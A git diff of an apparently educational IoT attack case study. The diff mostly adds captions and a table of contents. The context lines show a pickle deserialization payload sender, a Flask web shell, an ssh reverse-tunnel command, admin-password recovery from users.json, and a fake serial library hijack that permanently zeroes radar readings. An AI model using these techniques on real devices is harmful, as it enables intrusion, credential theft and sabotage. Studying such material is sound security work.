@@ -29,6 +29,28 @@ Important: All the attack techniques and programs in this article are only for r
 
 [TOC]
 
+- [IoT System Cyber Attack Case Study 02](#iot-system-cyber-attack-case-study-02)
+    + [Python Deserialization Attack and Library Hijacking Attack](#python-deserialization-attack-and-library-hijacking-attack)
+    + [Introduction](#introduction)
+      - [Sub Projects Introduction](#sub-projects-introduction)
+      - [Attack Scenario Introduction](#attack-scenario-introduction)
+    + [Background Knowledge](#background-knowledge)
+      - [Python Deserialization Attack](#python-deserialization-attack)
+      - [Python Package Hijacking Attack](#python-package-hijacking-attack)
+      - [Python Web Shell Attack](#python-web-shell-attack)
+    + [IoT Cyber Attack Design](#iot-cyber-attack-design)
+      - [Design of Attack Path](#design-of-attack-path)
+      - [Design of Python Pickle Bomb](#design-of-python-pickle-bomb)
+      - [Design of Flask Web Shell Attack Script](#design-of-flask-web-shell-attack-script)
+    + [IoT Cyber Attack Demo](#iot-cyber-attack-demo)
+      - [Understand the Traffic and Find Vulnerabilities](#understand-the-traffic-and-find-vulnerabilities)
+      - [Building Pickle Bomb for Deserialization Attacks](#building-pickle-bomb-for-deserialization-attacks)
+      - [Bypass IoT Authorization and Implement Local File Hijacking Attack](#bypass-iot-authorization-and-implement-local-file-hijacking-attack)
+      - [Show the IoT Attack Effect](#show-the-iot-attack-effect)
+    + [MITRE CWE Matching and ATT&CK Mapping](#mitre-cwe-matching-and-att-ck-mapping)
+      - [MITRE CWE(Common Weakness Enumeration) Matching](#mitre-cwe-common-weakness-enumeration--matching)
+      - [MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) Mapping](#mitre-att-ck--adversarial-tactics--techniques--and-common-knowledge--mapping)
+
 ------
 
 ### Introduction
@@ -279,26 +301,30 @@ In the previous step, the attacker identified that the IoT device uses port 5000
 
 ![](img/s_07.png)
 
-However, the attacker is blocked by the user login authorization page as they do not have a valid account to access further information:
+` Figure-06: IoT people count radar home page screen shot, version v1.3 (2024)`
+
+However, the attackers are blocked by the user login authorization page as they do not have a valid account to access further information:
 
 ![](img/s_08.png)
 
+` Figure-06: IoT people count radar login page screen shot, version v1.3 (2024)`
+
 Despite attempting a dictionary attack, the attacker finds that there is a user named "admin" but does not know the password.
 
-**Summary of Vulnerabilities** 
+**Summary of Possible Vulnerabilities** 
 
 After performing a network analysis, the attacker identifies two potential vulnerabilities:
 
 1. The IoT ZMQ channel uses pickle to serialize the data, presenting an opportunity to create a pickle bomb for a Python deserialization attack.
-2. There is a user named "admin" who can log in to the IoT's management page, but the attacker needs to find a way to bypass the authorization.
+2. There is a user named "admin" who can log in to the IoT's management page, but the attacker needs to find a way to bypass the user authorization.
 
 
 
 #### Building Pickle Bomb for Deserialization Attacks
 
-Based on the first vulnerability, the attacker aims to create a Pickle Bomb to exploit the ZMQ server. For reference, you can follow this project to build a UDP command executor: [Pickle Bomb Project](https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/pickleBomb). In this section, we provide an alternative and simpler solution by creating a web shell capable of executing commands on the IoT device.
+Based on the first vulnerability, the attacker aims to create a Pickle Bomb to exploit the ZMQ server. For reference, you can follow this project to build a UDP command executor: [Pickle Bomb Project](https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/pickleBomb). In this section, we will provide an alternative and simpler solution by creating a web shell capable of executing commands on the IoT device.
 
-We use Flask to build the web shell program, and for data feedback, we use Socket.IO to dynamically update the command execution results on the web page. Since port 5000 is used by the IoT management web host, our web shell will use port 5001. Additionally, to serialize the program into a single Pickle Bomb, the HTML page is assembled as a pure text string within the web shell program:
+We use Python-Flask to build the web shell program, and for data feedback, we use Socket.IO to dynamically update the command execution results on the web page. Since port 5000 is used by the IoT management web host, our web shell will use another port 5001. Additionally, to serialize the program into a single Pickle Bomb, the HTML page is assembled as a pure text string within the web shell program:
 
 ```python
 # The all in one version of the flask web shell which remove all the comments 
@@ -389,7 +415,7 @@ if __name__ == '__main__':
 
 To download the full code of the web shell, please refer to this repo: https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/flaskWebShell
 
-After finished the web shell attack scrip, we need to build a Pickle bomb and send to the IoT's ZMQ server. You can use this [Pickle Bomb Builder](https://github.com/LiuYuancheng/Python_Malwares_Repo/blob/main/src/pickleBomb/pickleBombBuilder.py) program, here we combine the builder and data sender together:
+After finished the web shell attack script, we need to build a "Pickle bomb" and send to the IoT's ZMQ server. You can use this [Pickle Bomb Builder](https://github.com/LiuYuancheng/Python_Malwares_Repo/blob/main/src/pickleBomb/pickleBombBuilder.py) program, here we combine the builder and data sender together:
 
 ```python
 iotIP = '172.23.155.209'
@@ -421,11 +447,13 @@ reqDict = pickle.loads(replyData)
 print ("Received reply: \n %s" %str(reqDict))
 ```
 
-After running the sender program to send the web shell pickle bomb as a data string to the IoT device, we can open the URL: `http://172.23.155.209:5001/`. The attack web shell appears as shown below, indicating that we have successfully activated the bomb and compromised the IoT device.
+After running the sender program to send the web shell pickle bomb as one data string to the IoT device, the can open the URL: `http://172.23.155.209:5001/` remotely. The attack web shell appears as shown below, indicating that we have successfully activated the bomb and compromised the IoT device with by pass the user authorization.
 
 Now, let's try some commands to navigate to the IoT firmware folder and list the files information:
 
 ![](img/s_14.png)
+
+` Figure-07: WebShell attack: list all file information, version v1.3 (2024)`
 
 The deserialization attack was successful.
 
@@ -433,7 +461,7 @@ The deserialization attack was successful.
 
 #### Bypass IoT Authorization and Implement Local File Hijacking Attack
 
-Having successfully executed commands on the IoT device, the next step the attacker want to try is to create a reverse shell or transfer files using SCP. Let's first attempt the reverse shell command:
+Having successfully executed commands on the IoT device, the next step attacker wants to try is to create a reverse shell or transfer files to IoT device using SCP. Let's first attempt the reverse shell command:
 
 ```
 ssh -R 0.0.0.0:7070:localhost:22 172.23.155.1
@@ -443,11 +471,15 @@ However, we find that the SSH client is not installed, as shown by the error mes
 
 ![](img/s_17.png)
 
-Then the attacker want to try whether he can use command-line commands to modify the firmware for the attack. Based on the file permission configuration shown below, only the configuration file is writable; all firmware files are read-only and executable:
+` Figure-08: WebShell attack: result of ssh command execution, version v1.3 (2024)`
+
+Then the attacker wants to try whether he can use commands to modify the firmware files directly. Based on the file permission configuration shown below, only the text format configuration file is writable; all firmware files' permission are read-only and executable:
 
 ![](img/s_16.png)
 
-Based on the second vulnerability, the attacker searches for data related to the string "admin" using the command:
+` Figure-09: WebShell attack: list result of firmware file permission, version v1.3 (2024)`
+
+Based on the second vulnerability attacker found in previous section, the attacker try to search for data related to the string "admin" using the command:
 
 ```
 grep "admin" Xandar_Sensor_Web/src/*
@@ -457,9 +489,13 @@ This reveals a JSON file named `users.json` that contains the "admin" username a
 
 ![](img/s_15.png)
 
+` Figure-10: WebShell attack: result of grep search specific contents, version v1.3 (2024)`
+
 By viewing the contents of the `Xandar_Sensor_Web/src/users.json` file:
 
 ![](img/s_18.png)
+
+` Figure-11: WebShell attack: result of cat specific file in IoT, version v1.3 (2024)`
 
 The attacker finds the long password for the "admin" user:
 
@@ -467,33 +503,41 @@ The attacker finds the long password for the "admin" user:
 7kylHS@n3pEGgS$M&HYJmRf4A!a*xfdZADAG^HWDYx#tSBkjcW
 ```
 
-Using this password, the attacker can log in to the IoT admin page:
+Using this password, the attacker can log in to the IoT admin page now:
 
 ![](img/s_19.png)
 
-From here, we can view the radar detection results, manage radar users, and fetch data from the radar (as shown below). 
+` Figure-12: Login IoT web interface as admin, version v1.3 (2024)`
+
+From here, the attacker can view the radar detection results, adjust the radar parameters, manage IoT radar users, and fetch data from the radar (as shown below). 
 
 ![](img/s_20.png)
 
-However, while we cannot modify the firmware, the admin can fix the attack by reset IoT settings.  Is there a way to permanently compromise the IoT device?
+` Figure-13: View IoT radar people detection reuslt history, version v1.3 (2024)`
+
+However, while the attacker cannot modify the firmware, the admin can fix the attack by reset IoT settings.  Is there a way to permanently compromise the IoT device?
 
 Exploring all the pages, the attacker finally finds a place to upload text format configuration files from web UI to IoT storage, with the file name required to be `Config_xxx.txt`:
 
 ![](img/s_21.png)
 
-By examining the radar serial communication firmware module, it is found that it uses the Python serial library to read data from the people detection radar:
+` Figure-14:IoT managment page can upload config file (limited to text format) , version v1.3 (2024)`
+
+By examining the radar serial communication firmware module, it is found that it uses the Python serial library (`import serial`) to read data from the people detection radar via USB-COM connection:
 
 ![](img/s_22.png)
 
+` Figure-15: WebShell attack: Cat firmware file contents, version v1.3 (2024)`
+
 The serial communication is initialized with this code:
 
-```
+```python
 self.serComm = serial.Serial(self.serialPort, 115200, 8, 'N', 1, timeout=1)
 ```
 
-The `Serial.read()` function is used to read data from the radar. Then the attacker then creates a fake serial library for a local file hijacking attack. The `serial.py` file contains the following contents:
+The `Serial.read()` function is used to read data from the radar. Based on these information, the attacker can create a fake serial library for implementing a local file hijacking attack. The `serial.py` file contains the following contents:
 
-```
+```python
 from struct import pack
 
 class Serial(object):
@@ -509,16 +553,22 @@ class Serial(object):
                 data += pack('f', round(0), 2)
             dataByte += data
         return dataByte
+    def write(self):
+    	pass
     
     def close(self):
         pass
 ```
 
-The attacker renames this fake serial library to `Config_new.txt` and uploads it to the IoT via the web portal. Using the web shell, we can see that the fake config file is accepted by the IoT device:![](img/s_23.png)
+The attacker renames this fake serial library to `Config_new.txt` to by pass the IoT file format limitation and uploads it to the IoT via the web portal. Using the web shell, we can see that the fake config file is accepted by the IoT device:
+
+![](img/s_23.png)
+
+` Figure-16: WebShell attack: list firmware directory , version v1.3 (2024)`
 
 Finally, the attacker renames the file from the web shell with the command:
 
-```
+```shell
 mv Xandar_Sensor_Web/src/Config_new.txt Xandar_Sensor_Web/src/serial.py
 ```
 
@@ -526,7 +576,9 @@ Now the local hijacking attack lib file is ready for import by the firmware:
 
 ![](img/s_24.png)
 
-The library hijacking attack is now complete.
+` Figure-17: WebShell attack: list firmware directory , version v1.3 (2024)`
+
+The library hijacking attack is now completed.
 
 
 
@@ -536,13 +588,19 @@ With the configuration unchanged and the fake serial communication module hijack
 
 ![](img/s_27.png)
 
-After restarting the IoT device, the network admin will see the following situation upon logging in:
+` Figure-18: WebShell attack: cat fake serial lib contents , version v1.3 (2024)`
+
+Any time after the IoT infra engineer restarting the IoT device, the network admin will see the following situation upon logging in:
 
 ![](img/s_25.png)
+
+` Figure-19: IoT radar show error data , version v1.3 (2024)`
 
 The radar connection indicator shows that the radar is connected normally, but all readings have dropped to zero. Upon checking, all readings display a value of 0:
 
 ![](img/s_26.png)
+
+` Figure-20: All radar paramters reading are incorrect , version v1.3 (2024)`
 
 Regardless of whether the IoT engineer reboots the IoT OS or resets the configuration file, the problem persists. The IoT device is now permanently compromised! 
 
